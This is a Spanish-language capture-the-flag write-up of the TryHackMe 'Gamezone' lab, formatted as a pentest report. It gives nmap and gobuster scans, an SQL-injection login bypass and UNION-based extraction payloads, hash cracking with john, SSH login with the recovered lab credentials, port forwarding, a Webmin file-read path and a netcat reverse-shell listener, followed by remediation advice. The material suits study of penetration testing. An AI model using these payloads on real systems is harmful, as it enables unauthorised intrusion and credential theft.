# 🚩 Gamezone

## INDICE
- [1. Portada](#1-portada)
- [2. Resumen Ejecutivo](#2-resumen-ejecutivo)
- [3. Banderas del reto](#3-banderas-del-reto)
- [4. Alcance](#4-alcance)
- [5. Metodología](#5-metodología)
- [6. Evidencias](#6-evidencias)
- [7. Tabla de comandos](#7-tabla-de-comandos)
- [8. MITRE ATT&CK](#8-mitre-attck)
- [9. Flags obtenidas](#9-flags-obtenidas)
- [10. Conclusiones](#10-conclusiones)
- [11. Recomendaciones](#11-recomendaciones)
- [12. Conclusión del reto](#12-conclusión-del-reto)
- [13. Deslinde de responsabilidad](#13-deslinde-de-responsabilidad)

---

## 1. Portada

**Título del reto:** Gamezone  
**Autor:** Mtro. Mitchell Correa — Alumno de Ciberseguridad  
**Fecha:** 12/Dic/25  
**Plataforma:** TryHackMe (THM) / Certificación PMJ  
**Nivel de confidencialidad:** EDUCATIVO  

---

## 2. Resumen Ejecutivo

Durante el reto **Gamezone**, como parte de la certificacion **"PMJ"** de **"HACKER MENTOR"** se realizó enumeración de servicios expuestos en el objetivo, identificando **SSH (22/tcp)** y **HTTP (80/tcp)**. Mediante **fuzzing de rutas** y pruebas en el portal, se confirmó una **inyección SQL (SQLi) tipo UNION-based** que permitió enumerar la base de datos (`db`), localizar la tabla `users` y extraer el **hash de contraseña** del usuario `agent47`.

Posteriormente, se efectuó **crackeo del hash (RAW-SHA256)** con `john` y el diccionario `rockyou`, recuperando la contraseña **`vid...**, con la cual se obtuvo acceso remoto por **SSH** y se capturó la **user flag** desde `user.txt`. Ya dentro del sistema, se detectó un servicio interno en el puerto **10000/tcp**, expuesto localmente mediante **SSH port forwarding** hacia `127.0.0.1:2000`, identificándose **Webmin** versión **1.580**.

Finalmente, se aprovechó un vector asociado a `file/show.cgi` para **lectura de archivos** y se estableció una **reverse shell**, obteniendo acceso como **root** y recuperando la **root flag** desde `/root/root.txt`. El escenario refleja fallas críticas: **SQLi**, **credenciales débiles** y **componente administrativo vulnerable** con impacto de **compromiso total**.

---

## 3. Banderas del reto

> Preguntas traducidas al español (cuando aplica) y respuestas basadas **únicamente** en evidencias proporcionadas.

| # | Pregunta (ES) |
|---|---|---|
| 1 | ¿Cuál es el nombre del gran avatar caricaturesco sosteniendo un francotirador en el foro? |
| 2 | Al iniciar sesión, ¿a qué página te redirige? |
| 3 | En la tabla `users`, ¿cuál es la contraseña hasheada? |
| 4 | ¿Qué usuario está asociado con el hash anterior? |
| 5 | ¿Cuál era el otro nombre de tabla (además de `users`)? |
| 6 | ¿Cuál es la contraseña deshasheada (plaintext)? |
| 7 | ¿Cuál es la *user flag*? |
| 8 | ¿Cuántos sockets TCP están corriendo? |
| 9 | ¿Cómo se llama el CMS expuesto? | 
| 10 | ¿Cuál es la versión del CMS? |
| 11 | ¿Cuál es la *root flag*? |

---

## 4. Alcance

- **Activo objetivo:** `10.81.xxx.xx`
- **Servicios identificados:** `22/tcp (SSH)`, `80/tcp (HTTP)` y servicios internos observados posteriormente (p. ej. `10000/tcp`).
- **Propósito:** estrictamente **educativo** (CTF / laboratorio controlado).

---

## 5. Metodología

> Orden aplicado: 
**-Reconocimiento**
**-Análisis de vulnerabilidades**
**-Explotación (Manual/Automática)**
**-Escalación de privilegios**
**-Banderas/Flags**
**-Herramientas usadas**
**-Conclusiones y Recomendaciones**

### 5.1 Reconocimiento
- Identificación de host activo y descubrimiento de puertos/servicios con `nmap`.  
- Validación de servidor web y rutas base.

### 5.2 Análisis de vulnerabilidades
- Ejecución de scripts `nmap --script vuln` (modo CTF).
- Búsqueda de rutas y recursos mediante `gobuster`.

### 5.3 Explotación (Manual/Automática)
- **Manual:** SQLi en `portal.php` para enumeración de `information_schema`, tablas y columnas; extracción de hash.
- **Automática / apoyo:** `john` con `rockyou` para crackeo de hash.

### 5.4 Escalación de privilegios
- Acceso por SSH con credenciales recuperadas.
- Enumeración de puertos locales; exposición de servicio interno con **SSH port forwarding**.
- Abuso de Webmin 1.580 y reverse shell para obtener **root**.

### 5.5 Banderas/Flags
- Captura de `user.txt` y `root.txt`, además de respuestas de banderas intermedias.

### 5.6 Herramientas usadas
- `nmap`, `gobuster`, navegador web, `john`, `netexec`, `ssh`, `netstat`, `ss`, `searchsploit`, `nc` (con `rlwrap`), `python`.

### 5.7 Conclusiones y Recomendaciones
- Basadas en hallazgos evidenciados: SQLi, credenciales débiles, componente administrativo vulnerable.

---

## 6. Evidencias

> Cada evidencia incluye: **Objetivo, Descripción de la bandera, Comandos útiles, Qué hizo (técnico), Persona común, Evidencia sugerida**.

### Evidencia 1 — Acceso inicial al sitio (HTTP)

**Objetivo:** Identificar superficie web inicial y navegación base.  
**Descripción de la bandera:** Bandera 1 (avatar del foro).  
**Comandos útiles:** No aplica (evidencia visual).  
**Qué hizo (técnico):** Se accedió a `http://10.81.170.23` observando el portal “Game Zone” y su menú (incl. “COMMUNITY”).  
**Persona común:** Como entrar al lobby de un edificio y ver las puertas disponibles (recepción, comunidad, descargas).  
**Evidencia sugerida:** `FOTO_1_Home_Login_GameZone.png`

---

### Evidencia 2 — Enumeración inicial (Nmap), rutas y bypass de login

**Objetivo:** Identificar servicios, rutas y posible vector de acceso.  
**Descripción de la bandera:** Bandera 2 (redirección tras login).  
**Comandos útiles:**
- `nmap -n -Pn -T4 -sS --open -p- --min-rate 3000 10.81.170.23`
- `nmap -n -Pn -sV -sC -vv --min-rate 3000 -p22,80 -oA nmap/10.81.170.23_version_scan 10.81.170.23`
- `nmap -n -Pn --min-rate 3000 -vv --script vuln -p22,80 -oA nmap/10.81.170.23_vuln_scan 10.81.170.23`
- `gobuster dir -u http://10.81.170.23 -w /usr/share/wordlists/dirb/common.txt -x txt,php,zip -s 200,204,301,302,307,401,403 -b "" -t 200 -k -o gobuster.txt`
- Payload login: `' or 1=1 -- -`
**Qué hizo (técnico):** Se detectaron `22/tcp` y `80/tcp`; se intentó `robot.txt` (no encontrado); con `gobuster` se localizaron rutas como `/portal.php` (302). Se realizó bypass de autenticación con SQLi en `index.php`, obteniendo redirección a `portal.php`.  
**Persona común:** Revisar puertas y pasillos del edificio, encontrar un acceso alterno y pasar con una credencial falsa.  
**Evidencia sugerida:** `FOTO_2_Nmap_Gobuster_SQLi_Login.png`

---

### Evidencia 3 — SQLi UNION-based: enumeración de DB y extracción de hash

**Objetivo:** Enumerar base de datos y extraer credenciales desde la tabla `users`.  
**Descripción de la bandera:** Bandera 3 (hash en `users`).  
**Comandos útiles / payloads (entrada en el buscador del portal):**
- `ORDER BY 4 -- -`
- `UNION SELECT 1,2, database() -- -`
- `UNION SELECT 1,2, user() -- -`
- `UNION SELECT NULL, @@HOSTNAME, @@VERSION#`
- `UNION SELECT 1, 2, table_name FROM information_schema.tables WHERE table_schema='db'#`
- `UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name='users'#`
- `UNION SELECT 1, username, pwd FROM users #`
**Qué hizo (técnico):** Se identificó el número de columnas mediante error de `ORDER BY`; se enumeró `database()` (`db`), `user()` (`root@localhost`) y versión (`5.7.27-0ubuntu0.16.04.1`). Luego se listaron tablas (`post`, `users`) y columnas (`username`, `pwd`) para extraer el hash del usuario.  
**Persona común:** Hacer preguntas cada vez más específicas hasta que el sistema “confiesa” qué información guarda y dónde la guarda.  
**Evidencia sugerida:** `FOTO_3_SQLi_Union_Enumeracion_Extraccion.png`

---

### Evidencia 4 — Asociación usuario ↔ hash (tabla `users`)

**Objetivo:** Confirmar el usuario asociado al hash extraído.  
**Descripción de la bandera:** Bandera 4 (username asociado).  
**Comandos útiles:** (Resultado de `UNION SELECT 1, username, pwd FROM users #`).  
**Qué hizo (técnico):** Se observó `agent47` como usuario y su hash asociado en la salida del portal.  
**Persona común:** Ver la etiqueta del dueño pegada junto a una llave.  
**Evidencia sugerida:** `FOTO_4_User_Hash_agent47.png`

---

### Evidencia 5 — Enumeración de la otra tabla en `db`

**Objetivo:** Identificar tablas disponibles en el esquema `db`.  
**Descripción de la bandera:** Bandera 5 (otra tabla).  
**Comandos útiles / payload:**
- `UNION SELECT 1, 2, table_name FROM information_schema.tables WHERE table_schema='db'#`
**Qué hizo (técnico):** La enumeración mostró `users` y `post`, confirmando el segundo nombre solicitado.  
**Persona común:** Revisar un índice de carpetas y ver que hay “Usuarios” y “Posts”.  
**Evidencia sugerida:** `FOTO_5_Tablas_db_users_post.png`

---

### Evidencia 6 — Preparación del hash para crackeo (archivo local)

**Objetivo:** Dejar el hash en un archivo para procesarlo con herramientas de crackeo.  
**Descripción de la bandera:** Bandera 6 (contraseña deshasheada).  
**Comandos útiles:**
- `touch hash.txt`
- `echo "ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14" > hash.txt`
- `cat hash.txt`
**Qué hizo (técnico):** Se creó `hash.txt` y se guardó el hash para usarlo con `john`.  
**Persona común:** Escribir un candado (hash) en un papel para intentar abrirlo con un llavero (diccionario).  
**Evidencia sugerida:** `FOTO_6_Preparacion_hash_txt.png`

---

### Evidencia 7 — Crack de hash con John (RAW-SHA256)

**Objetivo:** Recuperar contraseña en texto claro desde el hash.  
**Descripción de la bandera:** Bandera 6 (de-hashed password).  
**Comandos útiles:**
- `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256`
**Qué hizo (técnico):** Se ejecutó `john` con `rockyou` y formato `Raw-SHA256`, obteniendo la contraseña **`videogamer124`**.  
**Persona común:** Probar muchas llaves comunes hasta que una abre el candado.  
**Evidencia sugerida:** `FOTO_7_John_Crack_Password.png`

---

### Evidencia 8 — Acceso por SSH (NetExec) y obtención de user flag

**Objetivo:** Acceder al sistema con credenciales recuperadas y capturar `user.txt`.  
**Descripción de la bandera:** Bandera 7 (user flag).  
**Comandos útiles:**
- `netexec ssh 10.81.170.23 -u 'agent47' -p 'videogamer124'`
- `netexec ssh 10.81.170.23 -u 'agent47' -p 'videogamer124' -x "pwd"`
- `netexec ssh 10.81.170.23 -u 'agent47' -p 'videogamer124' -x "ls"`
- `netexec ssh 10.81.170.23 -u 'agent47' -p 'videogamer124' -x "cat user.txt"`
**Qué hizo (técnico):** Se validó acceso SSH con `agent47:videogamer124`, se ubicó `/home/agent47/`, se listó `user.txt` y se leyó la flag.  
**Persona común:** Entrar con la llave correcta a una habitación y leer una nota sobre el escritorio.  
**Evidencia sugerida:** `FOTO_8_SSH_NetExec_UserFlag.png`

---

### Evidencia 9 — Conteo de sockets TCP (netstat/ss)

**Objetivo:** Identificar servicios escuchando y cuantificar sockets TCP.  
**Descripción de la bandera:** Bandera 8 (número de sockets TCP).  
**Comandos útiles:**
- `netstat -lnt`
- `ss -tulpn`
**Qué hizo (técnico):** Se observaron listeners (p. ej. 22, 80, 3306, 10000, y otro listener reportado), contabilizando **5** sockets TCP.  
**Persona común:** Contar cuántas puertas están “abiertas” y esperando conexiones.  
**Evidencia sugerida:** `FOTO_9_TCP_Sockets_netstat_ss.png`

---

### Evidencia 10 — SSH Port Forwarding para exponer Webmin internamente

**Objetivo:** Acceder desde local a un servicio interno (10000/tcp) no expuesto directamente.  
**Descripción de la bandera:** Bandera 10 (nombre del CMS).  
**Comandos útiles:**
- `ssh -L 2000:localhost:10000 agent47@10.81.170.23`
- `netstat -lnt` (validación local de `127.0.0.1:2000`)
**Qué hizo (técnico):** Se creó un túnel SSH para mapear `localhost:10000` del objetivo a `127.0.0.1:2000` local, permitiendo abrir el login de Webmin en el navegador.  
**Persona común:** Instalar un “tubo privado” para llevar una puerta interna del edificio hasta tu casa.  
**Evidencia sugerida:** `FOTO_10_SSH_Tunnel_Webmin_Login.png`

---

### Evidencia 11 — Identificación de versión de Webmin

**Objetivo:** Confirmar versión del CMS para buscar vulnerabilidades conocidas.  
**Descripción de la bandera:** Bandera 11 (versión del CMS).  
**Comandos útiles:** No aplica (evidencia visual del panel).  
**Qué hizo (técnico):** En el dashboard de Webmin se verificó **Webmin version: 1.580**.  
**Persona común:** Ver la etiqueta de versión del software como si fuera el modelo exacto de un dispositivo.  
**Evidencia sugerida:** `FOTO_11_Webmin_Version_1580.png`

---

### Evidencia 12 — Explotación de Webmin, reverse shell y root flag

**Objetivo:** Obtener ejecución de comandos y privilegios de root para capturar `root.txt`.  
**Descripción de la bandera:** Bandera 12 (root flag).  
**Comandos útiles:**
- `searchsploit webmin`
- Acceso/lectura: `127.0.0.1:2000/file/show.cgi/etc/passwd`
- Listener: `rlwrap -cAr nc -lvnp 4000`
- TTY: `python -c "import pty; pty.spawn('/bin/bash')"`
- `cd /root`
- `ls`
- `cat root.txt`
**Qué hizo (técnico):** Se investigaron exploits disponibles para Webmin y se verificó lectura de archivos (`/etc/passwd`) usando `file/show.cgi`. Posteriormente, se estableció una reverse shell hacia el atacante, se estabilizó la TTY y se accedió como `root` para leer `root.txt`, obteniendo la flag final.  
**Persona común:** Encontrar un panel de administración vulnerable, abrir una puerta de servicio y terminar con acceso total a la “sala de control”.  
**Evidencia sugerida:** `FOTO_12_Webmin_Exploit_ReverseShell_RootFlag.png`

---

## 7. Tabla de comandos

| Comando | Uso | Ejemplo | Evidencia |
|---|---|---|---|
| `nmap -n -Pn -T4 -sS --open -p- --min-rate 3000 10.81.170.23` | Descubrimiento rápido de puertos | Escaneo full TCP | Evidencia 2 |
| `nmap -n -Pn -sV -sC -vv --min-rate 3000 -p22,80 -oA ... 10.81.170.23` | Fingerprinting y scripts por defecto | Versiones/servicios | Evidencia 2 |
| `nmap -n -Pn --min-rate 3000 -vv --script vuln -p22,80 -oA ... 10.81.170.23` | Detección de vulns por scripts | Chequeos automáticos | Evidencia 2 |
| `gobuster dir -u http://10.81.170.23 -w ... -x txt,php,zip ...` | Descubrimiento de rutas web | Enum de `/portal.php` | Evidencia 2 |
| `' or 1=1 -- -` | Bypass de login (SQLi) | Input en login | Evidencia 2 |
| `ORDER BY 4 -- -` | Identificar columnas (SQLi) | Provoca error controlado | Evidencia 3 |
| `UNION SELECT 1,2, database() -- -` | Identificar DB activa | `db` | Evidencia 3 |
| `UNION SELECT 1,2, user() -- -` | Identificar usuario BD | `root@localhost` | Evidencia 3 |
| `UNION SELECT NULL, @@HOSTNAME, @@VERSION#` | Hostname/versión motor | Enumeración MySQL | Evidencia 3 |
| `UNION SELECT 1, 2, table_name FROM information_schema.tables WHERE table_schema='db'#` | Enumerar tablas | `users`, `post` | Evidencia 3/5 |
| `UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name='users'#` | Enumerar columnas | `username`, `pwd` | Evidencia 3 |
| `UNION SELECT 1, username, pwd FROM users #` | Extraer usuario/hash | `agent47` + hash | Evidencia 3/4 |
| `touch hash.txt` | Crear archivo | Preparación | Evidencia 6 |
| `echo "<hash>" > hash.txt` | Guardar hash | Para crackeo | Evidencia 6 |
| `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256` | Crack de hash | Recupera `videogamer124` | Evidencia 7 |
| `netexec ssh 10.81.170.23 -u 'agent47' -p 'videogamer124'` | Validar acceso SSH | Shell access | Evidencia 8 |
| `netexec ssh ... -x "cat user.txt"` | Ejecutar comando remoto | Leer flag | Evidencia 8 |
| `netstat -lnt` | Ver puertos TCP en escucha | Conteo sockets | Evidencia 9/10 |
| `ss -tulpn` | Ver sockets y procesos | Conteo sockets | Evidencia 9 |
| `ssh -L 2000:localhost:10000 agent47@10.81.170.23` | Port forwarding | Exponer Webmin | Evidencia 10 |
| `searchsploit webmin` | Buscar exploit público | Webmin 1.580 | Evidencia 12 |
| `rlwrap -cAr nc -lvnp 4000` | Listener reverse shell | Recibir conexión | Evidencia 12 |
| `python -c "import pty; pty.spawn('/bin/bash')"` | Estabilizar TTY | Mejorar shell | Evidencia 12 |
| `cat root.txt` | Leer root flag | `/root/root.txt` | Evidencia 12 |

---

## 8. MITRE ATT&CK

> Clasificación basada **solo** en lo evidenciado.

| Táctica | Técnica | ID | Evidencia |
|---|---|---|---|
| Reconocimiento | Active Scanning | T1595 | Evidencia 2 (Nmap) |
| Descubrimiento | Network Service Discovery | T1046 | Evidencia 2 (puertos/servicios) |
| Acceso inicial | Exploit Public-Facing Application (SQLi) | T1190 | Evidencias 2–3 (SQLi en web) |
| Acceso a credenciales | Password Cracking | T1110.002 | Evidencia 7 (john + rockyou) |
| Acceso inicial / Movimiento lateral | Remote Services: SSH | T1021.004 | Evidencia 8 (acceso SSH) |
| Comando y Control | Protocol Tunneling (SSH port forwarding) | T1572 | Evidencia 10 (ssh -L) |
| Escalación de privilegios | Exploitation for Privilege Escalation | T1068 | Evidencia 12 (Webmin → root) |
| Recopilación | Data from Local System | T1005 | Evidencias 8 y 12 (lectura de flags) |

---

## 9. Flags obtenidas

- **Bandera 3 (hash):** `ab5...`
- **Bandera 6 (password):** `vid...`
- **Bandera 7 (user flag):** `649a...`
- **Bandera 12 (root flag):** `a4b...`

---

## 10. Conclusiones

- 🔥 **SQL Injection (SQLi) permitió bypass y extracción de datos sensibles**: se enumeraron DB/tablas/columnas y se extrajo hash desde `users`. (Evidencias 2–4)
- 🔥 **Credenciales débiles**: el hash fue crackeado con diccionario (`rockyou`) recuperando contraseña utilizable para acceso SSH. (Evidencias 7–8)
- 🔥 **Compromiso total del sistema**: mediante exposición de Webmin (v1.580) y explotación asociada a `file/show.cgi`, se obtuvo acceso root y lectura de `root.txt`. (Evidencias 10–12)
- ⚠️ **Superficie interna accesible mediante túneles**: servicio en `10000/tcp` pudo ser accedido vía port forwarding, indicando necesidad de hardening/segmentación adicional. (Evidencias 9–10)

---

## 11. Recomendaciones

1. **Corregir SQLi en la aplicación web (CRÍTICO)**
   - Implementar **consultas parametrizadas (prepared statements)**.
   - Validación/normalización de entradas del usuario y manejo seguro de errores.
2. **Rotación de credenciales y política de contraseñas (CRÍTICO)**
   - Forzar contraseñas robustas, evitar reutilización, habilitar MFA donde aplique.
   - Monitorear intentos de crack/uso indebido.
3. **Actualizar/retirar Webmin vulnerable (CRÍTICO)**
   - Actualizar Webmin a una versión soportada y parcheada.
   - Restringir acceso por **firewall/allowlist** y/o VPN.
4. **Hardening de servicios internos (MEDIA)**
   - Minimizar puertos en escucha; restringir MySQL a interfaces necesarias.
   - Revisar configuraciones de SSH (por ejemplo, limitar tunneling si no es requerido).
5. **Monitoreo y registro (MEDIA)**
   - Registrar eventos de autenticación (web/SSH), consultas anómalas y acceso a endpoints sensibles.

---

## 12. Conclusión del reto

El reto permitió practicar una cadena completa de ataque con evidencias claras: **enumeración → SQLi → extracción de hash → crackeo → acceso SSH → tunneling → explotación de Webmin → root**.  
La técnica más determinante fue la **SQLi UNION-based**, ya que habilitó la enumeración de la base de datos y la obtención de credenciales.  
Como aprendizaje adicional, se comprobó que los **servicios internos** (como Webmin en `10000/tcp`) pueden quedar expuestos si un atacante obtiene un punto de apoyo y usa **port forwarding**.  
La fase final reforzó la importancia de mantener componentes administrativos **actualizados** y correctamente restringidos (firewall/allowlist/VPN).  
Para mejorar futuras resoluciones, se recomienda registrar siempre versión exacta, endpoints utilizados y salidas completas de comandos para un reporte aún más reproducible.

---

## 13. Deslinde de responsabilidad

Este material se elaboró con fines **educativos** y de **entrenamiento** en un entorno controlado (CTF). No debe utilizarse para actividades no autorizadas. El autor y este documento no promueven el uso indebido de las técnicas descritas.
